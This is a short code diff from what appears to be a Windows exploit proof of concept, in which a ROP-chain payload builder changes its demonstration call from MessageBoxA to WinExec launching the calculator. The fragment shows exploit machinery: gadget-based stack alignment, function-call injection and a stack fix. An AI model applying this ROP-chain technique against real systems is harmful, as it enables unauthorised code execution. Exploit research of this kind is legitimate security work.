@@ -166,8 +166,9 @@ DWORD64* BuildPayload(RuntimeParams* runtime_parameters)
     if ((runtime_parameters->tos + 10 * sizeof(DWORD64)) & 0xF)
         ROP_chain[rop_pos++] = GADGET_ret;
 
-    // Call MessageBoxA as POC
-    FunctionCall((DWORD64)MessageBoxA, 0, 0, 0, 0);
+    // Call WinExec("calc", SW_SHOW) as verifiable POC
+    static char cmd[] = "calc";
+    FunctionCall((DWORD64)WinExec, (DWORD64)cmd, 1, 0, 0);
 
     // STACK FIX - restore original stack
     SetRcx(runtime_parameters->orig_tos);
